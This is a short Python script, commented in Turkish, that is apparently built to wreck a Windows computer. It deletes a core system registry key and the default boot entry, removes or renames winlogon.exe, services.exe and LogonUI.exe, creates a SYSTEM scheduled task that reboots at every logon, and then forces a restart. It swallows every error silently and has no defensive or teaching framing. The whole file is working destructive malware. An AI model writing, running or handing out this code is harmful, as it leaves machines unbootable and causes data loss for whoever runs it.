import os
import subprocess
import time

# 1. Kayıt defterini boz
try:
    subprocess.run('reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control /f', shell=True)
except:
    pass

# 2. BCD'yi boz
try:
    subprocess.run('bcdedit /delete {default} /f', shell=True)
except:
    pass

# 3. winlogon.exe'yi sil/taşı
try:
    os.rename("C:\\Windows\\System32\\winlogon.exe", "C:\\Windows\\System32\\winlogon.exe.bak")
except:
    pass

# 4. services.exe'yi sil
try:
    os.remove("C:\\Windows\\System32\\services.exe")
except:
    pass

# 5. LogonUI.exe'yi sil
try:
    os.remove("C:\\Windows\\System32\\LogonUI.exe")
except:
    pass

# 6. Sonsuz yeniden başlatma döngüsü (Task Scheduler)
try:
    subprocess.run('schtasks /create /tn "ShutdownLoop" /tr "shutdown /r /t 0" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True)
except:
    pass

# 7. Bilgisayarı yeniden başlat
os.system("shutdown /r /t 0")
